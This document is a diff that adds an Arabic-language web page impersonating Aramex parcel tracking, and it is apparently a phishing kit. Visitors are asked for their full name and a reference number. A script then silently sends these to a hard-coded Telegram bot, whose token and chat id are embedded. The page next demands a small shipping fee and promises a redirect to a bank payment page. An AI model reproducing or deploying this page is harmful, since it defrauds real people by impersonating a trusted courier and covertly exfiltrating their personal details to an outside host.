@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>تتبع شحنتك - أرامكس</title>
+</head>
+<body>
+<div style="text-align: center; font-family: Arial, sans-serif; direction: rtl; padding: 20px;">
+  <!-- شعار أرامكس -->
+  <img src="https://i.ibb.co/2k0Y0vw/aramex-logo.png" alt="شعار أرامكس" style="width: 150px; margin-bottom: 20px;">
+
+  <!-- الصفحة الأولى -->
+  <div id="page1">
+    <img src="https://i.ibb.co/6HcbrZJ/aramex-worker.jpg" alt="عامل أرامكس يحمل طرد" style="width: 90%; max-width: 400px; border-radius: 12px; margin-bottom: 20px;">
+    <h2 style="color: #d62027;">تتبع شحنتك</h2>
+    <input id="ref" type="text" placeholder="أدخل رقم التصريح *" style="width: 80%; max-width: 300px; padding: 10px; margin: 10px; border: 1px solid #ccc; border-radius: 5px;">
+    <input id="name" type="text" placeholder="أكتب الاسم بالكامل *" style="width: 80%; max-width: 300px; padding: 10px; margin: 10px; border: 1px solid #ccc; border-radius: 5px;">
+    <button onclick="goToPage2()" style="width: 80%; max-width: 300px; background-color: #d62027; color: white; border: none; padding: 10px; font-size: 16px; border-radius: 5px;">متابعة</button>
+  </div>
+
+  <!-- الصفحة الثانية -->
+  <div id="page2" style="display: none;">
+    <h3 style="color: green;">تم العثور على طلب شحنة</h3>
+    <hr style="width: 50%; border: 1px solid green; margin: 15px auto;" />
+    <p style="color: gray;">الرجاء إكمال الطلب.</p>
+    <p>لإتمام إكمال طلب شحنتك وتأكيد طلب الشحنة، الرجاء دفع الرسوم المطلوب من قبل صاحب الشحنة</p>
+    <p><strong>رسوم إصدار الشحنة:</strong> <span style="color: green;">12 درهم</span></p>
+    <p><strong>حالة الشحنة:</strong> <span style="color: green;">في الإنتظار الدفع</span></p>
+    <div style="background-color: #f4f4f4; padding: 15px; border-radius: 10px; margin: 20px;">
+      <p><strong style="color: green;">ملاحظة:</strong></p>
+      <p>بعد دفع رسوم شحنتك، يتم إرسال فاتورة على رقم جوالك تحتوي على جميع تفاصيل الشحنة، وسيتم التواصل من قبل أحد المناديب لتسليم الشحنة</p>
+    </div>
+    <button onclick="goToPage3()" style="background-color: red; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 10px; cursor: pointer;">دفع الآن</button>
+    <p style="margin-top: 10px; font-size: 14px; color: gray;">سيتم تحويلك على صفحة البنوك للدفع</p>
+  </div>
+
+  <!-- الصفحة الثالثة -->
+  <div id="page3" style="display: none;">
+    <h3 style="color: green;">تم الدفع بنجاح</h3>
+    <p>تم استلام طلبك وسيتم التواصل معك لتوصيل الشحنة في أقرب وقت.</p>
+    <p>شكراً لاستخدامك أرامكس!</p>
+  </div>
+
+  <!-- الفوتر -->
+  <img src="https://i.ibb.co/PZFLV1P/aramex-footer.jpg" alt="روابط تواصل أرامكس" style="width: 100%; max-width: 500px; margin-top: 30px;">
+</div>
+
+<script>
+  function goToPage2() {
+    const ref = document.getElementById("ref").value;
+    const name = document.getElementById("name").value;
+    if (ref && name) {
+      sendToTelegram(name, ref);
+      document.getElementById("page1").style.display = "none";
+      document.getElementById("page2").style.display = "block";
+    } else {
+      alert("يرجى تعبئة جميع الحقول");
+    }
+  }
+
+  function goToPage3() {
+    document.getElementById("page2").style.display = "none";
+    document.getElementById("page3").style.display = "block";
+  }
+
+  function sendToTelegram(name, ref) {
+    const token = "7989790132:AAHz9OQWA-fUb31PJb8wKVFBt6q-t5Pco2g";
+    const chat_id = "5153102841";
+    const message = `طلب تتبع جديد:\nالاسم: ${name}\nرقم التصريح: ${ref}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chat_id, text: message })
+    });
+  }
+</script>
+</body>
+</html>
